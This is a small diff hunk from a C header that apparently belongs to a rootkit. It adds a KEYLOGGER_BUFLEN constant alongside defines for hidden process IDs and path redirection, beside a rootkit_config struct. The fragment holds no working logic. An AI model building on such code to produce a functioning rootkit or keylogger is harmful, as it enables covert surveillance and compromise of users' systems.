@@ -5,6 +5,7 @@
 #define MAX_HIDDEN_PIDS   1024
 #define MAX_PATH_LEN	  512
 #define MAX_PATH_REDIRECT 32
+#define KEYLOGGER_BUFLEN  2048
 
 struct rootkit_config {
 	int state;
